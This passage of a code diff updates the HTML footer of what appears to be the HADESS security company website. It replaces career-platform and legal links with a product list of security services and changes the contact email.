           <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-          <a href="mailto:career@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+          <a href="mailto:security@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
         </div>
       </div>
-      <!-- Platform -->
-      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Platform</h3>
+      <!-- Products -->
+      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Products</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/skills-development" style="font-size:13px;color:var(--text-muted);transition:color 0.3s">Skills Development</a></li>
-          <li><a href="https://career.hadess.io/career-coaching" style="font-size:13px;color:var(--text-muted)">Career Coaching</a></li>
-          <li><a href="https://career.hadess.io/career-paths" style="font-size:13px;color:var(--text-muted)">Career Paths</a></li>
-          <li><a href="https://career.hadess.io/skills" style="font-size:13px;color:var(--text-muted)">Skills Explorer</a></li>
-          <li><a href="https://career.hadess.io/coach" style="font-size:13px;color:var(--text-muted)">Find a Coach</a></li>
-          <li><a href="https://career.hadess.io/roadmap-selector" style="font-size:13px;color:var(--text-muted)">Roadmap Selector</a></li>
-          <li><a href="https://career.hadess.io/salary-calculator" style="font-size:13px;color:var(--text-muted)">Salary Calculator</a></li>
-          <li><a href="https://career.hadess.io/tax-calculator" style="font-size:13px;color:var(--text-muted)">Tax Calculator</a></li>
-          <li><a href="https://career.hadess.io/knowledge-model" style="font-size:13px;color:var(--text-muted)">Knowledge Model</a></li>
-          <li><a href="https://career.hadess.io/pricing" style="font-size:13px;color:var(--text-muted)">Pricing</a></li>
+          <li><a href="/products/#career" style="font-size:13px;color:var(--text-muted)">Career</a></li>
+          <li><a href="/products/#asm" style="font-size:13px;color:var(--text-muted)">Attack Surface Management</a></li>
+          <li><a href="/products/#sast" style="font-size:13px;color:var(--text-muted)">SAST</a></li>
+          <li><a href="/products/#red-team" style="font-size:13px;color:var(--text-muted)">Red Team Operations</a></li>
+          <li><a href="/products/#vulnerability-research" style="font-size:13px;color:var(--text-muted)">Vulnerability Research</a></li>
         </ul>
       </div>
       <!-- Resources -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Resources</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/knowledge-base" style="font-size:13px;color:var(--text-muted)">Knowledge Base</a></li>
-          <li><a href="https://career.hadess.io/case-studies" style="font-size:13px;color:var(--text-muted)">Case Studies</a></li>
           <li><a href="/blog" style="font-size:13px;color:var(--text-muted)">Learning Materials</a></li>
-          <li><a href="https://career.hadess.io/certificate-roadmap" style="font-size:13px;color:var(--text-muted)">Certification Prep</a></li>
-          <li><a href="https://career.hadess.io/games/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Hack &amp; Learn</a></li>
           <li><a href="https://discord.gg/4XR3wWn3wp" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Community</a></li>
         </ul>
       </div>
       <!-- Company + Legal -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Company</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
-          <li><a href="https://career.hadess.io/mission" style="font-size:13px;color:var(--text-muted)">Our Mission</a></li>
-          <li><a href="mailto:career@hadess.io" style="font-size:13px;color:var(--text-muted)">Support</a></li>
-        </ul>
-        <h3 style="font-size:15px;font-weight:600;color:#fff;margin:28px 0 16px">Legal</h3>
-        <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/terms" style="font-size:13px;color:var(--text-muted)">Terms of Service</a></li>
-          <li><a href="https://career.hadess.io/privacy" style="font-size:13px;color:var(--text-muted)">Privacy Policy</a></li>
-          <li><a href="https://career.hadess.io/cancellation-policy" style="font-size:13px;color:var(--text-muted)">Cancellation Policy</a></li>
-          <li><a href="https://career.hadess.io/cookie-policy" style="font-size:13px;color:var(--text-muted)">Cookie Policy</a></li>
-          <li><a href="https://career.hadess.io/imprint" style="font-size:13px;color:var(--text-muted)">Imprint</a></li>
-          <li><a href="https://career.hadess.io/dmca" style="font-size:13px;color:var(--text-muted)">DMCA Notice</a></li>
-          <li><a href="https://career.hadess.io/image-rights" style="font-size:13px;color:var(--text-muted)">Image Rights</a></li>
-          <li><a href="https://career.hadess.io/security" style="font-size:13px;color:var(--text-muted)">Security</a></li>
+          <li><a href="/about-us/" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
+          <li><a href="mailto:security@hadess.io" style="font-size:13px;color:var(--text-muted)">Contact</a></li>
         </ul>
       </div>
     </div>
